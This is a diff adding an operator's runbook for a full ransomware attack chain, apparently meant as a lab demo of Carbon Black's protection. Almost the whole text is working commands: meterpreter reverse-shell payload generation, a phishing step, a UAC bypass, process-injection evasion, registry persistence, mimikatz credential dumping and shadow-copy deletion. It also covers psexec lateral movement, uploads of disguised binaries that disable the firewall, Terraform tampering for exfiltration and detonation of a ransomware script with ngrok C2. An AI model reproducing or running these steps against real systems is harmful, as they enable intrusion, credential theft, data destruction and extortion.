@@ -1,0 +1,176 @@
+1) generate payload to a file with either unicorn or msfvenom
+msfvenom: 
+- sudo msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows -e x86/shikata_ga_nai -i3 -f exe LHOST=192.168.230.137 LPORT=8080 -o /home/repulsivity/tools/POC/malicious_7zip.exe
+
+unicorn: 
+# git clone https://github.com/trustedsec/unicorn.git
+# ./unicorn.py windows/meterpreter/reverse_https 192.168.230.137 443 macro
+# cat powershell_attack.txt 
+Paste content in powershell_attack.txt into a formatted word document
+
+2) Enable the listener 
+# sudo msfconsole -r unicorn.rc
+
+3) Phish the victim either through email, or via SETOOLKIT via web-attack
+
+4) in the session (likely sessions 1) check on: 
+# getuid
+# sysinfo
+# ipconfig
+while you can try to get some basic enumeration going, you cannot get system privilieges
+# getsystem (failed because not privi user)
+# background
+
+Lets see what we can do to get privi escalation
+
+5) Privilege escalation
+meterpreter provides a local exploit suggester
+# use Post/multi/recon/local_exploit_suggester
+
+for demo purpose, we will use fodhelper exploit (run on msfconsole)
+# use exploit/windows/local/bypassuac_fodhelper
+# set SESSION 1
+# set TARGET 1
+# set payload windows/x64/meterpreter/reverse_https
+# set LHOST 192.168.230.137
+# set LPORT 8081
+# run
+
+It will create a new session - so on the new session (eg sessions 2), run the following to get system privi
+# getsystem
+add routing access to this device
+# run post/multi/manage/autoroute SUBNET=192.168.230.0 ACTION=ADD
+
+6) Evasion
+Let's also try to evade ourselves so it's not too obvious. We'll get notepad to run, and do a process injection into Notepad.exe, so now all processes will be seen as though it's running via notepad.exe
+In an actual scenario, attackers will use system processes like explorer.exe or svchosts.exe to hide their tracks better
+
+# execute -H -f notepad.exe (this will cause notepad to be hidden)
+# run post/windows/manage/migrate NAME=notepad.exe SPAWN=false
+
+Now that we have hidden our tracks, we can do more enumeration. Attackers usually have their own toolkits to run. In this case, we'll use an enumeration powershell from nishang
+# load powershell
+# powershell_import /home/repulsivity/tools/nishang/Gather/Get-Information.ps1
+# powershell_execute Get-Information
+here we can see the account policies, the services running, apps installed, etc. 
+it is at this point in time we can disable any anti-virus software that might cause issues. but for the purpose of the demo we will move on.
+
+7) Persistance
+Now we get into persistance. One of the ways is to run a scheduled task to keep the persistance script running. Meterpreter provides a module for us to use
+# background (back to meterpreter)
+# use exploit/windows/local/persistence
+# set session 2 (this will be the session created from #5)
+# set REG_NAME malwareregkey
+# set STARTUP SYSTEM
+# run
+
+8) Credentials
+This will be the point in time we can try to run exploits to get credentials. Meterpreter provides mimikatz module to load, of which we can attempt to dump the hashes. Of course, we can use powershell to pull a mimikatz module to run if you're more comfortable.
+# sessions 2
+# load kiwi
+# help
+We can dump the hashes. In the case of Kiwi, we have the ability to attempt to do a golden ticket creation, exactly what happened with the Solarwind attack. In the interest of time, we will "fast forward" and assume that we have done all the relevant steps to get the domain admin / administrators' passwords
+
+9) Discovery
+This is where we'll start with discovering the network. We can do a network portscan, etc, whatever that is available through meterpreter. For the demo, we will attempt a TTP used by wannacry to exploit vulnerable SMBv1. While most modern Windows hosts are patched, where SMBv1 is disabled, many older Win Servers (2019 and below in my prep for this demo), they are still running SMBv1. 
+# use auxiliary/scanner/portscan/tcp
+# set RHOST 192.168.230.138 
+# set PORTS 139,445,3389
+# set THREADS 5
+# run
+
+Before we move laterally, let's do our ransomware preperation as well. we will delete the shadow copies - since there's no point in a ransomware encrypting everything but at the end of the day it's as simple as restoring from shadow copy. 
+# sessions 2
+# execute -f 'vssadmin.exe list shadows'
+# execute -f 'vssadmin.exe delete shadows'
+# execute -f 'vssadmin.exe resize shadowstorage'
+# execute -f 'wmic.exe logicaldisk get deviceid,volumename,description'
+# execute -f 'wmic.exe shadowcopy delete'
+
+We can also upload any additional files we want to the target machine before we move on to the "next" victim
+# upload /var/www/Win20H2Update.exe c:\\windows\\system32
+# upload /var/www/winupdate.ps1 c:\\windows\\system32
+# upload /var/www/winupdate.wsf c:\\windows\\system32
+# upload /var/www/update.bat c:\\windows\\system32
+# upload /var/www/zoom.exe c:\\windows\\system32
+# upload /var/www/cmstp.exe c:\\windows\\system32
+# upload /var/www/microsoft.crt c:\\windows\\system32
+# execute -f update.bat -H (this will run a bat file to 1) decode Win20H2Update.exe using the microsoft.crt, and 2) disable windows firewall)
+# execute -f Win20H2Update.exe -H
+
+10) Lateral movement
+As shared, for the demo we're making use of the SMB exploit to move laterally.
+# use exploit/windows/smb/psexec
+# set RHOST 192.168.230.138
+# set SMBUser Victim1
+# set SMBPass VMware1!
+# set payload windows/meterpreter/reverse_https
+# set lhost 192.168.230.137
+# set lport 8080
+# run
+
+11) Exfiltration
+Now that we have SYSTEM access, the idea is to find the crown jewels. Of course, I won't bore you with details, but just that we see that there's a lazy admin who decided to code with his secret key exposed and in plain text. 
+We'll make the relevant changes to his terraform code so that when it runs, it will upload a file. In my context it's a simple plaintext file, but in actual reality, it can be anyway - from a cobalt strike beacon to create more zombies, to pure data exfiltration, etc
+
+############################
+terraform code
+############################
+#FOR UBUNTU SERVER ONLY
+resource "aws_instance" "ubuntu_server" {
+    ami             = "ami-00e912d13fbb4f225" #creates Ubuntu Server 
+    instance_type   = "t3.small"
+    subnet_id       = aws_subnet.demo_subnet.id
+    security_groups = [aws_security_group.demo_SG.id]
+    key_name        = aws_key_pair.public_key.id
+    associate_public_ip_address = true
+    tags = {
+      "Name" = "Demo-Ubuntu-20.04"
+    }
+
+## This is the portion to add in ## 
+ provisioner "file" {
+    source      = "/Users/dominicc1/Desktop/dummyfile.txt"
+    destination = "/home/ubuntu/dummyfile.txt"
+
+      connection {
+        type = "ssh"
+        user = "ubuntu"
+        private_key = file("/Users/dominicc1/Desktop/Dominic/Dom_AWS_Keypair.pem")
+        host = aws_instance.ubuntu_server.public_ip
+      }
+    }
+}
+############################
+End of terraform code
+############################
+
+12) Extortion
+Now we come to the attack. In this case, I'll be running a python script that will encrypt all the files. This is a server and client script, whereby the client will reach out to a NGROK address for C2 communication. 
+
+- install ngrok and authorise your ngrok account (follow steps on ngrok. you might need)
+
+- start ngrok server 
+# python3 server.py
+- copy the FQDN from the output and copy into the ransom0.py script
+# sudo nano /var/www/ransom0.py (paste the FQDN)
+
+# upload /var/www/ransom0.py c:\\users\\victim1
+# upload /var/www/detonate.bat c:\\users\\vicitim1
+# execute -f 'c:\\users\\victim1\\detonate.bat'
+
+Upon execution, you will see that server will show 4 digits as well as the decryption key
+
+13) Show how Carbon Black can protect you against ransomware
+
+Follow the above steps, but DO NOT EXECUTE detonate.bat
+Move the computer to a stricter policy - I recommend the POC_Good_policy
+Run the same attack, either via the batch file, or directly via CLI as Administrator
+
+# py ransom0.py
+
+You will see a popup showing that ransom0.py was doing suspected ransomware behaviour
+
+#####
+End
+#####
